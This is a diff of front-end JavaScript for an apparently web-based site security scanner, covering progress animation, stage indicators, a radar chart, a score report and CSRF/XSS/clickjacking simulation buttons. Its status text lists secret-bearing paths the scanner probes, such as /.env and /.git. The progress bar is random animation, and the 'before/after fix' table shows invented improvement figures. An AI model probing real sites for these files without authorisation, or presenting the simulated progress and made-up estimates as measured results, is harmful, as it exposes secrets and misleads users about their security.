+        '<div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.4);animation:pulse-ring 2s ease-out infinite"></div>' +
+        '<div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(168,85,247,0.3);animation:pulse-ring 2s ease-out infinite 0.6s"></div>' +
+        '<div id="scan-3d-core" style="position:absolute;inset:42px;border-radius:50%;background:radial-gradient(circle,rgba(75,110,175,0.7),rgba(75,110,175,0.15));display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;box-shadow:0 0 30px rgba(75,110,175,0.5)">' +
+          '<span id="scan-percent" style="font-size:26px;font-weight:800;line-height:1">0%</span>' +
+          '<span style="font-size:9px;opacity:0.8;margin-top:2px">扫描中</span>' +
+        '</div>' +
+      '</div>' +
+    '</div>' +
+    // 进度条
+    '<div style="max-width:min(420px,calc(100% - 32px));margin:0 auto 16px">' +
+      '<div style="height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden">' +
+        '<div id="scan-main-progress" style="height:100%;width:0%;background:#3c3f41;border-radius:3px;transition:width 0.5s ease;box-shadow:0 0 10px rgba(75,110,175,0.5)"></div>' +
+      '</div>' +
+    '</div>' +
+    // 实时检测项滚动
+    '<div id="scan-live-text" style="height:20px;font-size:12px;color:#a5b4fc;margin-bottom:14px;text-align:center;overflow:hidden;transition:all 0.3s">' +
+      '<span style="display:inline-block;animation:scan-text-glow 1.5s ease-in-out infinite">正在初始化扫描引擎...</span>' +
+    '</div>' +
+    '<h2 style="margin-bottom:6px;font-size:clamp(16px,5vw,20px)">正在扫描 ' + escapeHtml(host) + '</h2>' +
+    '<p style="color:var(--text-lighter);font-size:12px;margin-bottom:18px">AI 安全引擎 · 7 阶段实时分析中</p>' +
+    '<div style="max-width:min(420px,calc(100% - 32px));margin:0 auto;text-align:left">' + stagesHtml + '</div>' +
+    '<button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s" onmouseover="this.style.background=\'rgba(199,84,80,0.25)\'" onmouseout="this.style.background=\'rgba(199,84,80,0.15)\'"> 取消扫描</button>' +
+    '</div>' +
+    '<style>' +
+    '@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}' +
+    '@keyframes pulse-ring{0%,100%{transform:scale(1);opacity:1}}' +
+    '@keyframes scan-text-glow{0%,100%{opacity:1}}' +
+    '</style>';
+  container.innerHTML = progressHtml;
+  // 启动进度动画
+  startProgressAnimation();
+  let scanDepth = (document.querySelector('input[name="scan-depth"]:checked') || {}).value || 'standard';
+  let deepScan = scanDepth === 'deep';
+  startRealScan(url, host, deepScan);
+}
+
+// 更新单个阶段状态
+function updateStage(stageId, status) {
+  let el = document.getElementById('stage-' + stageId);
+  if (!el) return;
+  el.style.opacity = '1';
+  let icon = el.querySelector('.stage-icon');
+  let statusEl = el.querySelector('.stage-status');
+  if (status === 'running') {
+    el.style.background = 'rgba(75,110,175,0.12)';
+    el.style.borderColor = 'rgba(75,110,175,0.4)';
+    icon.style.background = 'rgba(75,110,175,0.4)';
+    icon.style.color = '#fff';
+    icon.innerHTML = '刷新';
+    icon.style.animation = 'spin 1s linear infinite';
+    statusEl.innerHTML = '<span style="color:#a5b4fc">扫描中</span>';
+  } else if (status === 'done') {
+    el.style.background = 'rgba(115,201,144,0.1)';
+    el.style.borderColor = 'rgba(115,201,144,0.3)';
+    icon.style.background = 'rgba(115,201,144,0.3)';
+    icon.style.color = '#73c990';
+    icon.style.animation = 'none';
+    icon.innerHTML = '';
+    statusEl.innerHTML = '<span style="color:#73c990">完成</span>';
+  } else if (status === 'fail') {
+    el.style.background = 'rgba(199,84,80,0.1)';
+    el.style.borderColor = 'rgba(199,84,80,0.3)';
+    icon.style.background = 'rgba(199,84,80,0.3)';
+    icon.style.color = '#c75450';
+    icon.style.animation = 'none';
+    icon.innerHTML = '';
+    statusEl.innerHTML = '<span style="color:#c75450">失败</span>';
+  }
+}
+
+// 依次激活每个阶段（带 700ms 间隔，阶段动画展示）
+let _stageTimer = null;
+function animateStages() {
+  let stages = ['dns', 'connect', 'headers', 'ssl', 'sensitive', 'waf', 'report'];
+  let i = 0;
+  if (_stageTimer) { clearInterval(_stageTimer); _stageTimer = null; }
+  function tick() {
+    if (i > 0 && i <= stages.length) updateStage(stages[i - 1], 'done');
+    if (i < stages.length) {
+      updateStage(stages[i], 'running');
+      i++;
+    } else {
+      clearInterval(_stageTimer);
+      _stageTimer = null;
+    }
+  }
+  tick();
+  _stageTimer = setInterval(tick, 700);
+}
+function finishStages() {
+  if (_stageTimer) { clearInterval(_stageTimer); _stageTimer = null; }
+  let stages = ['dns', 'connect', 'headers', 'ssl', 'sensitive', 'waf', 'report'];
+  stages.forEach(function(s) { updateStage(s, 'done'); });
+  // 进度条完成
+  setScanProgress(100, '扫描完成，正在生成报告...');
+}
+
+// 11-S: 扫描进度动画（百分比 + 实时检测项文字）
+let _progressTimer = null;
+let _progressTextTimeouts = [];
+let _currentProgress = 0;
+let _scanTextIndex = 0;
+let _scanTexts = [
+  '正在初始化扫描引擎...',
+  'DNS 域名解析中...',
+  '建立 TCP 连接...',
+  '发送 HTTP 请求...',
+  '分析响应头安全配置...',
+  '检查 HSTS 配置...',
+  '检查 CSP 内容安全策略...',
+  '检查 X-Frame-Options...',
+  '检查 X-Content-Type-Options...',
+  '检查 Referrer-Policy...',
+  '检查 Permissions-Policy...',
+  '检测 SSL/TLS 证书...',
+  '验证证书链完整性...',
+  '检查证书有效期...',
+  '扫描敏感路径...',
+  '检测 /.env 文件...',
+  '检测 /.git 目录...',
+  '检测 /admin 后台...',
+  '检测 /phpinfo.php...',
+  '检测 /.DS_Store...',
+  '识别 WAF 防火墙...',
+  '检测 Cloudflare...',
+  '检测 Nginx WAF...',
+  '检测 ModSecurity...',
+  '分析 CORS 跨域配置...',
+  '检测 Cookie 安全标志...',
+  '检查服务器信息泄露...',
+  '计算安全评分...',
+  '生成修复建议...',
+  '生成安全报告...',
+];
+
+function startProgressAnimation() {
+  _currentProgress = 0;
+  _scanTextIndex = 0;
+  if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null; }
+  if (_progressTextTimeouts) {
+    _progressTextTimeouts.forEach(function(t) { clearTimeout(t); });
+    _progressTextTimeouts = [];
+  }
+  let targetProgress = 0;
+  _progressTimer = setInterval(function() {
+    // 渐进式进度：先快后慢
+    if (_currentProgress < 30) {
+      targetProgress += Math.random() * 5 + 2;
+    } else if (_currentProgress < 60) {
+      targetProgress += Math.random() * 3 + 1;
+    } else if (_currentProgress < 85) {
+      targetProgress += Math.random() * 2 + 0.5;
+    } else {
+      targetProgress += Math.random() * 0.8 + 0.2;
+    }
+    targetProgress = Math.min(targetProgress, 95); // 最多到 95%，等真正完成再到 100%
+    if (_currentProgress < targetProgress) {
+      _currentProgress += (targetProgress - _currentProgress) * 0.3;
+      _currentProgress = Math.min(_currentProgress, 95);
+    }
+    // 更新进度条
+    let bar = document.getElementById('scan-main-progress');
+    let percentEl = document.getElementById('scan-percent');
+    if (bar) bar.style.width = Math.round(_currentProgress) + '%';
+    if (percentEl) percentEl.textContent = Math.round(_currentProgress) + '%';
+    // 切换检测文字
+    if (Math.random() < 0.15 && _scanTextIndex < _scanTexts.length - 1) {
+      _scanTextIndex++;
+      let textEl = document.getElementById('scan-live-text');
+      if (textEl) {
+        textEl.style.opacity = '0';
+        let tid = setTimeout(function() {
+          if (!_progressTimer) return; // 已停止则不更新
+          let span = textEl.querySelector('span');
+          if (span) span.textContent = _scanTexts[_scanTextIndex];
+          textEl.style.opacity = '1';
+        }, 200);
+        if (!_progressTextTimeouts) _progressTextTimeouts = [];
+        _progressTextTimeouts.push(tid);
+      }
+    }
+  }, 200);
+}
+
+function stopProgressAnimation() {
+  if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null; }
+  if (_progressTextTimeouts) {
+    _progressTextTimeouts.forEach(function(t) { clearTimeout(t); });
+    _progressTextTimeouts = [];
+  }
+}
+
+function setScanProgress(percent, text) {
+  _currentProgress = percent;
+  let bar = document.getElementById('scan-main-progress');
+  let percentEl = document.getElementById('scan-percent');
+  if (bar) bar.style.width = percent + '%';
+  if (percentEl) percentEl.textContent = Math.round(percent) + '%';
+  if (text) {
+    let textEl = document.getElementById('scan-live-text');
+    if (textEl) {
+      let span = textEl.querySelector('span');
+      if (span) span.textContent = text;
+    }
+  }
+  if (percent >= 100) {
+    if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null; }
+    if (_progressTextTimeouts) {
+      _progressTextTimeouts.forEach(function(t) { clearTimeout(t); });
+      _progressTextTimeouts = [];
+    }
+  }
+}
+
+// Render Result
+function buildRadarSvg(data) {
+  // 5 个维度评分（0-100）：响应头、SSL、敏感文件、WAF、漏洞检测
+  let dims = [
+    { name: '安全响应头', score: 0 },
+    { name: 'SSL/TLS', score: 0 },
+    { name: '敏感文件', score: 0 },
+    { name: 'WAF 防护', score: 0 },
+    { name: '漏洞检测', score: 0 }
+  ];
+  // 根据 findings 反推各维度得分
+  let findings = data.findings || [];
+  findings.forEach(function(f) {
+    let n = (f.name || '').toLowerCase();
+    let ow = (f.owasp || '').toLowerCase();
+    if (n.indexOf('安全响应头') >= 0 || n.indexOf('响应头') >= 0 || ow.indexOf('a05') >= 0) dims[0].score = Math.max(dims[0].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
+    if (n.indexOf('https') >= 0 || n.indexOf('ssl') >= 0 || n.indexOf('tls') >= 0 || n.indexOf('证书') >= 0) dims[1].score = Math.max(dims[1].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
+    if (n.indexOf('敏感文件') >= 0 || n.indexOf('.env') >= 0 || n.indexOf('.git') >= 0 || n.indexOf('暴露') >= 0) dims[2].score = Math.max(dims[2].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
+    if (n.indexOf('waf') >= 0 || n.indexOf('防火墙') >= 0) dims[3].score = Math.max(dims[3].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
+    if (n.indexOf('注入') >= 0 || n.indexOf('xss') >= 0 || n.indexOf('sql') >= 0 || n.indexOf('csrf') >= 0) dims[4].score = Math.max(dims[4].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
+  });
+  let hasFinding = findings.length > 0;
+  dims.forEach(function(d) { if (d.score === 0) d.score = hasFinding ? 85 : 95; });
+
+  // 构造 SVG（5 边形雷达图）
+  let cx = 150, cy = 150, r = 110;
+  let n = dims.length;
+  let points = [];
+  let html = '<svg viewBox="0 0 300 300" style="max-width:300px;margin:0 auto;display:block" aria-label="安全维度雷达图">';
+  for (let g = 1; g <= 5; g++) {
+    let rg = r * g / 5;
+    let gp = [];
+    for (let i = 0; i < n; i++) {
+      let a = -Math.PI / 2 + i * 2 * Math.PI / n;
+      gp.push((cx + rg * Math.cos(a)).toFixed(1) + ',' + (cy + rg * Math.sin(a)).toFixed(1));
+    }
+    html += '<polygon points="' + gp.join(' ') + '" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>';
+  }
+  for (let j = 0; j < n; j++) {
+    let a2 = -Math.PI / 2 + j * 2 * Math.PI / n;
+    html += '<line x1="' + cx + '" y1="' + cy + '" x2="' + (cx + r * Math.cos(a2)).toFixed(1) + '" y2="' + (cy + r * Math.sin(a2)).toFixed(1) + '" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>';
+  }
+  let dataPts = [];
+  for (let k = 0; k < n; k++) {
+    let a3 = -Math.PI / 2 + k * 2 * Math.PI / n;
+    let rv = r * dims[k].score / 100;
+    dataPts.push((cx + rv * Math.cos(a3)).toFixed(1) + ',' + (cy + rv * Math.sin(a3)).toFixed(1));
+    points.push({ x: cx + rv * Math.cos(a3), y: cy + rv * Math.sin(a3), name: dims[k].name, score: dims[k].score });
+  }
+  html += '<polygon points="' + dataPts.join(' ') + '" fill="rgba(75,110,175,0.35)" stroke="#4b6eaf" stroke-width="2"/>';
+  points.forEach(function(p) {
+    html += '<circle cx="' + p.x.toFixed(1) + '" cy="' + p.y.toFixed(1) + '" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="1.5"/>';
+  });
+  points.forEach(function(p, idx) {
+    let a4 = -Math.PI / 2 + idx * 2 * Math.PI / n;
+    let lx = cx + (r + 22) * Math.cos(a4);
+    let ly = cy + (r + 22) * Math.sin(a4);
+    let anchor = lx < cx - 5 ? 'end' : lx > cx + 5 ? 'start' : 'middle';
+    html += '<text x="' + lx.toFixed(1) + '" y="' + ly.toFixed(1) + '" text-anchor="' + anchor + '" dominant-baseline="middle" font-size="11" font-weight="600" fill="currentColor">' + escapeHtml(p.name) + ' ' + p.score + '</text>';
+  });
+  html += '</svg>';
+  return html;
+}
+
+function renderResult(data) {
+  try {
+  // SRC 级报告优先使用新渲染器
+  if (isSRCFormat(data)) {
+    initResultPage();
+    navigateTo('result');
+    renderSRCResult(data);
+    lastScanResult = data;
+    saveScanHistory(data);
+    return;
+  }
+  // 防御性兜底：确保 data 及核心字段存在
+  data = data || {};
+  // 严格类型校验：确保数组字段是真正的数组
+  data.findings = Array.isArray(data.findings) ? data.findings : [];
+  data.owasp_coverage = Array.isArray(data.owasp_coverage) ? data.owasp_coverage : [];
+  data.header_details = Array.isArray(data.header_details) ? data.header_details : [];
+  data.info_leaks = Array.isArray(data.info_leaks) ? data.info_leaks : [];
+  data.cookie_issues = Array.isArray(data.cookie_issues) ? data.cookie_issues : [];
+  data.waf = Array.isArray(data.waf) ? data.waf : [];
+  data.sensitive_paths = Array.isArray(data.sensitive_paths) ? data.sensitive_paths : [];
+  data.crawled_pages = Array.isArray(data.crawled_pages) ? data.crawled_pages : [];
+  data.vuln_tests = Array.isArray(data.vuln_tests) ? data.vuln_tests : [];
+  data.score_breakdown = Array.isArray(data.score_breakdown) ? data.score_breakdown : [];
+  data.owasp_coverage = Array.isArray(data.owasp_coverage) ? data.owasp_coverage : [];
+  // 确保 ai_report 是对象
+  data.ai_report = (data.ai_report && typeof data.ai_report === 'object') ? data.ai_report : { summary: '扫描完成', priority: '暂无优先事项' };
+  // 确保 score 是有效数字
+  data.score = typeof data.score === 'number' ? data.score : (parseInt(data.score, 10) || 0);
+  data.score = Math.max(0, Math.min(100, data.score));
+  // 确保 raw_headers 是对象
+  data.raw_headers = (data.raw_headers && typeof data.raw_headers === 'object') ? data.raw_headers : {};
+  let highCount = 0, medCount = 0, lowCount = 0;
+  data.findings.forEach(function(f) {
+    if (f.level === '高风险') highCount++;
+    else if (f.level === '中风险') medCount++;
+    else lowCount++;
+  });
+
+  let riskClass = data.score < 50 ? 'high' : data.score < 75 ? 'medium' : 'low';
+  let gradient = getScoreGradient(data.score);
+  let scoreColor = getScoreColor(data.score);
+
+  let html = '';
+
+  // Report Header
+  html += '<div class="report-header fade-in-up">';
+  html += '<div style="margin-bottom:12px">';
+  if (data.restricted) {
+    html += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">注意：受限扫描报告</span>';
+  } else {
+    html += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">真实扫描</span>';
+  }
+  html += '</div>';
+  // TLS 验证跳过警告
+  if (data.tls_verify_skipped) {
+    html += '<div style="background:rgba(199,84,80,0.08);border:1px solid rgba(199,84,80,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#c75450;line-height:1.6">';
+    html += '<strong>注意：诊断模式</strong><br/>';
+    html += '当前扫描跳过了 TLS 证书验证，结果仅供诊断参考。生产环境建议开启 TLS_VERIFY=true。';
+    html += '</div>';
+  }
+  // 受限扫描专业提示
+  if (data.restricted) {
+    html += '<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">';
+    html += '<strong>注意：受限扫描报告</strong><br/>';
+    html += '目标可访问，但存在登录/WAF/反爬限制（HTTP ' + (data.restricted_code || '') + '），<br/>';
+    html += '本次为受限扫描，部分结果需要人工确认。';
+    html += '</div>';
+  } else if (data.restricted_reason) {
+    html += '<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">';
+    html += '<strong>注意：受限访问提示</strong><br/>' + escapeHtml(data.restricted_reason);
+    html += '</div>';
+  }
+  // 跳转提示（蓝色信息提示，区别于黄色的受限扫描）
+  if (data.redirected) {
+    html += '<div style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#4b6eaf;line-height:1.6">';
+    html += '<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">';
+    html += '<div><strong>跳转提示</strong><br/>';
+    html += escapeHtml(data.redirect_reason || '目标发生跳转，建议扫描最终目标地址。');
+    html += '</div>';
+    html += '<button onclick="scanRedirectTarget()" style="background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;transition:background 0.15s" onmouseover="this.style.background=\'rgba(59,130,246,0.25)\'" onmouseout="this.style.background=\'rgba(59,130,246,0.15)\'">扫描最终地址</button>';
+    html += '</div></div>';
+  }
+  html += '<div class="score-ring-wrap score-pulse">';
+  html += '<div class="score-ring" style="background:' + gradient + '">';
+  html += '<div class="score-value" style="color:#fff">' + data.score + '</div>';
+  html += '<div class="score-label" style="color:rgba(255,255,255,0.7)">安全评分</div>';
+  html += '</div></div>';
+  html += '<div class="report-url">' + escapeHtml(data.url || '') + '</div>';
+  html += '<div class="report-time">' + (data.time || '') + '</div>';
+  html += '<span class="risk-badge ' + riskClass + '">' + (data.risk_level || '未知') + '</span>';
+  html += '</div>';
+
+  // Risk Stats
+  html += '<div class="risk-stats fade-in-up" style="animation-delay:0.1s">';
+  html += '<div class="risk-stat high"><div class="num">' + highCount + '</div><div class="label">高风险</div></div>';
+  html += '<div class="risk-stat medium"><div class="num">' + medCount + '</div><div class="label">中风险</div></div>';
+  html += '<div class="risk-stat low"><div class="num">' + lowCount + '</div><div class="label">低风险</div></div>';
+  html += '</div>';
+
+  // 雷达图：5 个 OWASP 维度得分
+  html += '<div class="card fade-in-up" style="animation-delay:0.15s">';
+  html += '<div class="card-title">安全维度雷达</div>';
+  html += '<div id="radar-chart-container" style="display:flex;justify-content:center"></div>';
+  html += '</div>';
+
+  // 攻击模拟按钮
+  html += '<div class="card fade-in-up" style="animation-delay:0.2s">';
+  html += '<div class="card-title">攻击模拟</div>';
+  html += '<p style="margin:0 0 14px 0;font-size:12px;color:var(--text-secondary)">展示常见攻击场景以验证漏洞影响</p>';
+  html += '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">';
+  html += '<button onclick="simulateCSRF(\'' + escapeAttr(data.url) + '\')" style="padding:10px 8px;border:1px solid rgba(199,84,80,0.3);background:rgba(199,84,80,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#dc2626;transition:background 0.15s" onmouseover="this.style.background=\'rgba(199,84,80,0.15)\'" onmouseout="this.style.background=\'rgba(199,84,80,0.08)\'">';
+  html += '<div style="font-size:13px;font-weight:600;color:var(--text-primary)">CSRF</div>';
+  html += '<div style="font-size:11px;font-weight:400;color:#7f1d1d">跨站请求伪造</div></button>';
+  html += '<button onclick="simulateXSS(\'' + escapeAttr(data.url) + '\')" style="padding:10px 8px;border:1px solid rgba(240,167,50,0.3);background:rgba(240,167,50,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#ea580c;transition:background 0.15s" onmouseover="this.style.background=\'rgba(240,167,50,0.15)\'" onmouseout="this.style.background=\'rgba(240,167,50,0.08)\'">';
+  html += '<div style="font-size:13px;font-weight:600;color:var(--text-primary)">XSS</div>';
+  html += '<div style="font-size:11px;font-weight:400;color:#f0a732">跨站脚本</div></button>';
+  html += '<button onclick="simulateClickjacking(\'' + escapeAttr(data.url) + '\')" style="padding:10px 8px;border:1px solid rgba(168,85,247,0.3);background:rgba(168,85,247,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#9333ea;transition:background 0.15s" onmouseover="this.style.background=\'rgba(168,85,247,0.15)\'" onmouseout="this.style.background=\'rgba(168,85,247,0.08)\'">';
+  html += '<div style="font-size:13px;font-weight:600;color:var(--text-primary)">Clickjacking</div>';
+  html += '<div style="font-size:11px;font-weight:400;color:#c084fc">点击劫持</div></button>';
+  html += '</div>';
+  html += '<div id="attack-demo-result" style="margin-top:14px"></div>';
+  html += '</div>';
+
+  //  评分解读（专业版）
+  if (data.score_breakdown && data.score_breakdown.length > 0) {
+    let totalDeduction = data.score_breakdown.reduce(function(s,b) { return s + b.deduction; }, 0);
+    
+    // 按严重程度分组
+    let criticalDeduct = 0, highDeduct = 0, medDeduct = 0, lowDeduct = 0;
+    let criticalItems = [], highItems = [], medItems = [], lowItems = [];
+    data.score_breakdown.forEach(function(b) {
+      if (b.severity === 'critical') { criticalDeduct += b.deduction; criticalItems.push(b); }
+      else if (b.severity === 'high') { highDeduct += b.deduction; highItems.push(b); }
+      else if (b.severity === 'medium') { medDeduct += b.deduction; medItems.push(b); }
+      else { lowDeduct += b.deduction; lowItems.push(b); }
+    });
+    
+    html += '<div class="card fade-in-up" style="animation-delay:0.25s">';
+    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">';
+    html += '<div style="display:flex;align-items:center;gap:10px">';
+    html += '<div class="card-title" style="margin:0">评分解读</div>';
+    html += '</div>';
+    html += '<span style="font-size:12px;background:rgba(240,167,50,0.15);color:#ea580c;padding:3px 10px;border-radius:2px;font-weight:600">共扣 ' + totalDeduction + ' 分</span>';
+    html += '</div>';
+    
+    // 扣分分布条形图
+    html += '<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">';
+    let maxDeduct = Math.max(criticalDeduct, highDeduct, medDeduct, lowDeduct, 1);
+    let barGroups = [
+      { label: '严重', count: criticalItems.length, deduct: criticalDeduct, color: '#dc2626', bg: 'rgba(220,38,38,0.15)' },
+      { label: '高风险', count: highItems.length, deduct: highDeduct, color: '#f0a732', bg: 'rgba(240,167,50,0.15)' },
+      { label: '中风险', count: medItems.length, deduct: medDeduct, color: '#f0a732', bg: 'rgba(240,167,50,0.15)' },
+      { label: '低风险', count: lowItems.length, deduct: lowDeduct, color: '#73c990', bg: 'rgba(115,201,144,0.15)' },
+    ];
+    barGroups.forEach(function(g) {
+      let width = g.count > 0 ? Math.max((g.deduct / maxDeduct) * 100, 8) : 0;
+      html += '<div style="display:flex;align-items:center;gap:10px">';
+      html += '<span style="font-size:12px;color:var(--text-secondary);min-width:48px;font-weight:600">' + g.label + '</span>';
+      html += '<div style="flex:1;height:20px;background:var(--bg-secondary);border-radius:2px;overflow:hidden;position:relative">';
+      html += '<div style="height:100%;width:' + width + '%;background:' + g.color + ';border-radius:2px;transition:width 0.6s ease"></div>';
+      html += '<span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:' + (width > 30 ? '#fff' : 'var(--text-secondary)') + '">' + g.count + ' 项 / -' + g.deduct + '分</span>';
+      html += '</div></div>';
+    });
+    html += '</div>';
+    
+    // 修复优先级建议
+    html += '<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:12px 14px">';
+    html += '<div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:8px;display:flex;align-items:center;gap:6px">';
+    html += '<span>修复优先级建议</span>';
+    html += '</div>';
+    let priorityTips = [];
+    if (criticalItems.length > 0) priorityTips.push('<strong style="color:#dc2626">紧急</strong>：立即修复严重漏洞（' + criticalItems.length + '项）');
+    if (highItems.length > 0) priorityTips.push('<strong style="color:#f0a732">重要</strong>：优先修复高风险配置问题（' + highItems.length + '项）');
+    if (medItems.length > 0) priorityTips.push('<strong style="color:#ca8a04">常规</strong>：计划修复中风险项（' + medItems.length + '项）');
+    if (lowItems.length > 0) priorityTips.push('<strong style="color:#16a34a">可选</strong>：低风险项可按需优化（' + lowItems.length + '项）');
+    if (priorityTips.length === 0) priorityTips.push('<strong style="color:#16a34a">优秀</strong>：未发现明显安全问题');
+    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">' + priorityTips.join('<br/>') + '</div>';
+    html += '</div>';
+    
+    // 展开详细扣分明细
+    html += '<details style="margin-top:12px">';
+    html += '<summary style="cursor:pointer;font-size:12px;font-weight:600;color:var(--text-secondary);list-style:none">';
+    html += '<span style="display:inline-flex;align-items:center;gap:6px">';
+    html += '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>';
+    html += '查看完整扣分明细';
+    html += '</span></summary>';
+    html += '<div style="margin-top:10px;max-height:240px;overflow-y:auto;padding-right:4px">';
+    let allItems = criticalItems.concat(highItems, medItems, lowItems);
+    allItems.forEach(function(b, idx) {
+      let sevColor = b.severity === 'critical' ? '#dc2626' : b.severity === 'high' ? '#f0a732' : b.severity === 'medium' ? '#ca8a04' : '#16a34a';
+      let sevLabel = b.severity === 'critical' ? '严重' : b.severity === 'high' ? '高' : b.severity === 'medium' ? '中' : '低';
+      html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-light);font-size:12px">';
+      html += '<div style="display:flex;align-items:center;gap:8px">';
+      html += '<span style="font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;background:' + sevColor + '20;color:' + sevColor + '">' + sevLabel + '</span>';
+      html += '<span style="color:var(--text-primary)">' + escapeHtml(b.item) + '</span>';
+      html += '</div>';
+      html += '<span style="font-weight:700;color:' + sevColor + '">- ' + b.deduction + '</span>';
+      html += '</div>';
+    });
+    html += '</div></details>';
+
+    html += '</div>';
+  }
+
+  //  修复前后价值对比
+  let _valBeforeScore = data.score || 0;
+  let _valAfterScore  = Math.min(98, _valBeforeScore + 25);
+  let _valBeforeRisk  = highCount + medCount;
+  let _valAfterRisk   = Math.max(0, Math.round(_valBeforeRisk * 0.25));
+  let _valBeforeHdr   = 0;
+  let _valAfterHdr    = 0;
+  let _valBeforePath  = 0;
+  let _valAfterPath   = 0;
+  if (data.findings) {
+    data.findings.forEach(function(f) {
+      let fn = f.name || '';
+      if (fn.indexOf('缺少') >= 0 && fn.indexOf('头') >= 0) _valBeforeHdr++;
+      if (fn.indexOf('敏感路径') >= 0 || fn.indexOf('目录遍历') >= 0 || fn.indexOf('.env') >= 0) _valBeforePath++;
+    });
+    _valAfterHdr  = 0;
+    _valAfterPath = Math.max(0, _valBeforePath - 2);
+  }
+  html += '<div class="card fade-in-up" style="animation-delay:0.18s">';
+  html += '<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">';
+  html += '<div class="card-title" style="margin:0">修复前后对比</div>';
+  html += '<span style="font-size:11px;background:rgba(115,201,144,0.15);color:#16a34a;padding:2px 8px;border-radius:2px;font-weight:600">预估</span>';
+  html += '</div>';
+  html += '<div style="overflow-x:auto">';
+  html += '<table style="width:100%;border-collapse:collapse;font-size:13px">';
+  html += '<thead><tr style="border-bottom:1px solid #555555">';
+  html += '<th style="text-align:left;padding:10px 8px;font-weight:600;color:var(--text-secondary)">项目</th>';
+  html += '<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">修复前</th>';
+  html += '<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">修复后</th>';
+  html += '<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">变化</th>';
+  html += '</tr></thead>';
+  html += '<tbody>';
+  let _rows = [
+    { label: '安全评分', before: _valBeforeScore, after: _valAfterScore, unit: '分', good: 'up' },
+    { label: '中高风险', before: _valBeforeRisk, after: _valAfterRisk, unit: '个', good: 'down' },
+    { label: '缺失安全头', before: _valBeforeHdr, after: _valAfterHdr, unit: '个', good: 'down' },
+    { label: '敏感路径风险', before: _valBeforePath, after: _valAfterPath, unit: '个', good: 'down' },
+    { label: '建议处理时间', before: '2 小时', after: '15 分钟', unit: '', good: 'down' },
+  ];
+  _rows.forEach(function(r, idx) {
+    let _delta = '';
+    if (typeof r.before === 'number' && typeof r.after === 'number') {
+      let _d = r.after - r.before;
+      let _dc = _d > 0 ? '#16a34a' : _d < 0 ? '#dc2626' : 'var(--text-secondary)';
+      let _ds = _d > 0 ? '+' + _d : String(_d);
+      _delta = '<span style="color:' + _dc + ';font-weight:700">' + _ds + '</span>';
+    } else {
+      _delta = '<span style="color:#16a34a;font-weight:700">大幅缩短</span>';
+    }
+    let _bg = idx % 2 === 0 ? 'transparent' : '#313335';
+    html += '<tr style="background:' + _bg + ';border-bottom:1px solid #555555">';
+    html += '<td style="padding:10px 8px;font-weight:600">' + r.label + '</td>';
+    html += '<td style="text-align:center;padding:10px 8px;color:var(--text-secondary)">' + r.before + (r.unit ? ' ' + r.unit : '') + '</td>';
+    html += '<td style="text-align:center;padding:10px 8px;color:var(--text-primary);font-weight:700">' + r.after + (r.unit ? ' ' + r.unit : '') + '</td>';
+    html += '<td style="text-align:center;padding:10px 8px">' + _delta + '</td>';
+    html += '</tr>';
